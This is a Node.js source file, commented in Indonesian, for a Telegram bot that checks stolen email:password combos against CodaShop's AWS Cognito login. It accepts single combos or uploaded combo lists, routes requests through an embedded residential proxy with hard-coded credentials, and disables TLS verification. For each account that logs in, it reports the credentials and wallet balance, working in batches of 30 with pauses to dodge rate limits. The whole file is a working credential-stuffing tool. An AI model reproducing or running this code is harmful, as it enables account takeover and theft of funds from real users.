process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823');

// Fungsi pembantu untuk membuat jeda (Sleep)
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ==========================================
// FUNGSI INTI PENGECEKAN API
// ==========================================
async function checkAccount(username, password) {
  try {
    const authPayload = JSON.stringify({
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    });

    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      httpsAgent: proxyAgent,
      validateStatus: () => true,
      timeout: 15000
    });

    const resData = authReq.data;

    if (resData && resData.AuthenticationResult) {
      const idToken = resData.AuthenticationResult.IdToken;

      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        validateStatus: () => true,
        timeout: 10000
      });

      const balance = walletReq.data?.data?.balanceAmount || 0;
      return { status: 'live', balance: balance, msg: 'Success' };
    } else {
      const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
      return { status: 'die', msg: msg };
    }
  } catch (error) {
    return { status: 'error', msg: 'Proxy Error/Timeout' };
  }
}

// ==========================================
// HANDLER: /START & /CODASHOP (Satuan)
// ==========================================
bot.start((ctx) => {
  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal (Jeda Otomatis): Kirim/upload file .txt ke bot ini.');
});

bot.command('codashop', async (ctx) => {
  const args = ctx.message.text.split(' ');
  
  if (args.length < 2) {
    return ctx.reply('❌ <b>Format Salah!</b>\n\nGunakan format:\n<code>/codashop username:password</code>', { parse_mode: 'HTML' });
  }

  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
  if (combo.length < 2) return ctx.reply('❌ Format Salah!');

  const username = combo[0].trim();
  const password = combo[1].trim();

  const loadingMsg = await ctx.reply('⏳ <i>Memproses...</i>', { parse_mode: 'HTML' });
  const result = await checkAccount(username, password);

  if (result.status === 'live') {
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${result.balance}</b>\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  } else {
    const icon = result.status === 'die' ? '❌ <b>DIE ACCOUNT</b>' : '⚠️ <b>ERROR ACCOUNT</b>';
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `${icon}\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${result.msg}\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// ==========================================
// HANDLER: UPLOAD FILE .TXT (Batch 30 + Jeda 5 Detik)
// ==========================================
bot.on('document', async (ctx) => {
  const doc = ctx.message.document;
  
  if (!doc.file_name.endsWith('.txt')) {
    return ctx.reply('❌ Kirim file dengan format .txt.');
  }

  const loadingMsg = await ctx.reply('📥 <i>File diterima! Memulai Auto-Mass Check...</i>', { parse_mode: 'HTML' });

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const response = await axios.get(fileLink.href);
    const textData = response.data;

    const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    if (lines.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid.');
    }

    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, `✅ Total <b>${lines.length} data</b> ditemukan!\n\nSistem: Mengecek 30 akun, lalu jeda 5 detik otomatis sampai selesai.`, { parse_mode: 'HTML' });

    // Memecah array menjadi potongan (chunk) berisi 30 data per proses
    const chunkSize = 30;
    
    for (let i = 0; i < lines.length; i += chunkSize) {
      const chunk = lines.slice(i, i + chunkSize);
      
      let liveResult = '';
      let liveCount = 0;
      let dieCount = 0;

      // Proses 30 data bersamaan
      const checkPromises = chunk.map(async (line) => {
        const combo = line.replace(/[|;\s]/g, ':').split(':');
        if (combo.length >= 2) {
          const u = combo[0].trim();
          const p = combo[1].trim();
          const res = await checkAccount(u, p);
          return { u, p, res };
        }
        return null;
      });

      const results = await Promise.all(checkPromises);

      results.forEach(item => {
        if (item && item.res.status === 'live') {
          liveCount++;
          liveResult += `<code>${item.u}:${item.p}</code> | Bal: <b>${item.res.balance}</b>\n`;
        } else if (item) {
          dieCount++;
        }
      });

      // Tampilkan hasil setiap kelipatan 30
      let finalMsg = `<b>📊 HASIL BATCH (${i + chunk.length}/${lines.length})</b>\n━━━━━━━━━━━━━━━━━━\n`;
      finalMsg += liveCount > 0 ? liveResult : `<i>Tidak ada Live di part ini.</i>\n`;
      finalMsg += `━━━━━━━━━━━━━━━━━━\n✅ Live: ${liveCount} | ❌ Die/Err: ${dieCount}`;

      await ctx.reply(finalMsg, { parse_mode: 'HTML' });

      // Jika masih ada sisa baris di batch selanjutnya, lakukan jeda 5 detik
      if (i + chunkSize < lines.length) {
        const infoMsg = await ctx.reply('⏳ <i>Jeda 5 detik sebelum lanjut batch berikutnya...</i>', { parse_mode: 'HTML' });
        await sleep(5000); // Tahan proses selama 5 detik
        await ctx.telegram.deleteMessage(ctx.chat.id, infoMsg.message_id).catch(() => {}); // Hapus pesan tunggu biar bersih
      } else {
        await ctx.reply('🏁 <b>SELURUH FILE SELESAI DICEK!</b>', { parse_mode: 'HTML' });
      }
    }

  } catch (error) {
    console.error(error);
    await ctx.reply('❌ Terjadi kesalahan saat membaca file. Pastikan internet / proxy stabil.');
  }
});

// ==========================================
// VERCEL HANDLER (Hanya formalitas kalau tetap mau ditaruh Vercel, walau rawan timeout)
// Jika dijalankan di Termux/VPS, hapus module.exports dan ganti jadi bot.launch();
// ==========================================
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan!');
    }
  } catch (error) {
    res.status(500).send('Error');
  }
};

// Uncomment kode di bawah ini jika kamu menjalankan file ini pakai Termux / VPS (node index.js)
// bot.launch().then(() => console.log('Bot VPS Mode Ready!'));
